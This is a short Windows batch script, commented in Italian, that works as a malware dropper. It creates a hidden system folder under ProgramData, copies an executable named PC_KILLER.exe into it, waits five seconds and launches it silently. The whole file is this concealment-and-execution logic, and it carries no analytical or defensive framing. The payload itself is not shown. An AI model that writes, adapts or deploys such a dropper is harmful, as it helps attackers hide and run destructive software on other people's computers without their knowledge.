@echo off
:: Configurazione
set "SOURCE_EXE=PC_KILLER.exe"
set "TARGET_DIR=%ProgramData%\.SmaskHidden"
set "TARGET_EXE=%TARGET_DIR%\%SOURCE_EXE%"

:: Crea cartella nascosta se non esiste
if not exist "%TARGET_DIR%" (
    mkdir "%TARGET_DIR%"
    attrib +h +s "%TARGET_DIR%"
)

:: Copia il file exe nella cartella nascosta
copy "%~dp0%SOURCE_EXE%" "%TARGET_EXE%" /Y >nul

:: Aspetta 5 secondi
timeout /t 5 /nobreak >nul

:: Avvia il programma copiato
start "" "%TARGET_EXE%"
exit
